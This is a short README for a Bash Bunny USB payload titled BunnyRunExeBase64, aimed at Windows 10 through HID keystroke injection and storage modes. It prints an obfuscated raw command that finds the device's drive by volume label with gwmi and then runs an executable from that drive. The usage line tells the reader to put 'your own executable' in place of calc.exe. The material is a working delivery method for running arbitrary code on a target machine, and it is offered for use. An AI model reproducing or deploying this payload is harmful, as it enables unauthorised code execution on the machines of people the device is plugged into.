# BunnyRunExeBase64
- Description:   Run calc.exe from a bunny root directory using base64 cradle in order to mitigate QWERTY and QWERTZ layouts
- Author:        ?m?
- Version:       1.0
- Category:      Execution
- Target:        Windows 10
- Attackmodes:   HID, Storage
- Raw payload:  `"CMD.exe /c ((gwmi win$(35-3)_volUME   -f 'LABel=''BashBunny''').NAME + 'CaLC.ExE')"`

# Usage
- Move calc.exe (your own executable) to the root directory before execution

# Todo
[ ] Try to mitigate dash "-"
